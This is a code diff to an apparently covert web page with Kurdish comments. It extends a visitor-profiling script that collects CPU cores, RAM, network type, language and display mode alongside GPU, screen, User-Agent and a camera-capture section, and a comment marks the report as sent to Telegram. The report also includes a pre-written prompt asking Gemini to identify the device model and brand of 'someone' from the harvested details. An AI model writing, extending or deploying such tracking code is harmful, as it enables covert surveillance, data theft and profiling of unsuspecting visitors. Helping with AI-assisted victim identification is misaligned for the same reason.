@@ -143,7 +143,22 @@
                 }
             } catch (e) {}
 
-            // 7. کامێرا و وێنەگرتن
+            // 7. زانیارییە نوێیەکان (RAM, CPU Cores, Network, Language, Dark Mode)
+            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
+            let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو (سنووردارکراو لەلایەن وێبگەڕ)";
+            
+            let netType = "نەزانراو";
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    netType = `جۆر: ${conn.effectiveType || 'نادیار'}, خێرایی نزیکەی: ${conn.downlink ? conn.downlink + ' Mbps' : 'نادیار'}`;
+                }
+            } catch (e) {}
+
+            let sysLang = navigator.language || "نەزانراو";
+            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";
+
+            // 8. کامێرا و وێنەگرتن
             let imageBlob = null;
             let cameraStatus = "";
             try {
@@ -188,10 +203,15 @@
                         `📱 سیستەم/ئامێر: ${deviceModel}\n` +
                         `📐 ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})\n` +
                         `🎮 کارتی گرافیک (GPU): ${gpuInfo}\n` +
+                        `🧠 ناوکەکانی پرۆسێسەر (CPU Cores): ${cpuCores}\n` +
+                        `💾 قەبارەی ڕام (RAM): ${deviceRam}\n` +
+                        `🛜 جۆری هێڵی ئینتەرنێت: ${netType}\n` +
+                        `🌐 زمانی سیستەم و وێبگەڕ: ${sysLang}\n` +
+                        `🌓 دۆخی شاشە: ${isDarkMode}\n` +
                         `🌐 User-Agent: ${userAgentText}\n\n` +
                         `🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n` +
                         `ئەگەر دەتەوێت بە دەقیقی جۆری مۆدێلی ئامێرەکەی بزانیت، ئەم ڕستەی خوارەوە کۆپی بکە و بینێرە بۆ جێمینای:\n\n` +
-                        `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە (بۆ نموونە: Samsung Galaxy S series, iPhone, Xiaomi, لاپتۆپ و غەیری)؟"`;
+                        `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە (بۆ نموونە: Samsung Galaxy S series, iPhone, Xiaomi, لاپتۆپ و غەیری)؟"`;
 
             // ناردنی دەقەکە بۆ تێلێگرام
             try {
